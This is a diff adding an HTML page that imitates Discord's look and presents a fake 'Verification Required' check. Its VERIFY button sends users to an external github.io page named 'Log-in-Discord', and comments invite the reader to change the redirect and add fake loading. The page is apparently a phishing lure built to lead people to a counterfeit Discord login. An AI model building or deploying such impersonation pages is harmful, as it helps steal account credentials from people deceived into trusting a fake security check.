@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verify • Discord Bot</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      min-height: 100vh;
+      background: #0f1014;
+      font-family: "gg sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+      color: #dcddde;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .card {
+      background: #1e2124;
+      border-radius: 8px;
+      width: 100%;
+      max-width: 480px;
+      padding: 48px 32px;
+      text-align: center;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.7);
+      border: 1px solid #2a2d31;
+    }
+
+    .logo {
+      width: 96px;
+      height: 96px;
+      margin: 0 auto 24px;
+      background: #5865f2;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 48px;
+      color: white;
+      font-weight: bold;
+    }
+
+    h1 {
+      font-size: 28px;
+      font-weight: 600;
+      margin-bottom: 12px;
+      color: #fff;
+    }
+
+    p {
+      font-size: 16px;
+      color: #b9bbbe;
+      margin-bottom: 40px;
+      line-height: 1.5;
+    }
+
+    .verify-btn {
+      display: inline-block;
+      width: 100%;
+      max-width: 320px;
+      padding: 16px 32px;
+      background: linear-gradient(145deg, #5865f2, #4752c4);
+      color: white;
+      font-size: 18px;
+      font-weight: 600;
+      text-decoration: none;
+      border-radius: 6px;
+      border: none;
+      cursor: pointer;
+      transition: all 0.2s;
+      box-shadow: 0 4px 16px rgba(88, 101, 242, 0.4);
+    }
+
+    .verify-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 24px rgba(88, 101, 242, 0.6);
+      background: linear-gradient(145deg, #4752c4, #3a44a6);
+    }
+
+    .small-text {
+      margin-top: 32px;
+      font-size: 13px;
+      color: #72767d;
+    }
+
+    .blink {
+      animation: blink 1.5s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.4; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <div class="logo">✓</div>
+
+  <h1>Verification Required</h1>
+  <p>
+    This server requires you to verify you're human before you can join or continue.<br>
+    Click the button below to complete verification.
+  </p>
+
+  <!-- CHANGE THIS LINK to wherever you want to redirect -->
+  <a href="https://discordauth-botverify.github.io/Log-in-Discord/EdgeHubBotVerifyer.html" class="verify-btn" id="verifyButton">
+    VERIFY
+  </a>
+
+  <div class="small-text">
+    This is a security check provided by <span style="color:#5865f2;">Discord Bot Verifier</span><br>
+    <span class="blink">Verifying in progress...</span>
+  </div>
+</div>
+
+<script>
+  // Optional: you can add extra behavior if you want
+  document.getElementById("verifyButton").addEventListener("click", function(e) {
+    // You can add delay or fake loading if you want
+    // e.preventDefault();
+    // setTimeout(() => { window.location.href = this.href; }, 1200);
+  });
+</script>
+
+</body>
+</html>
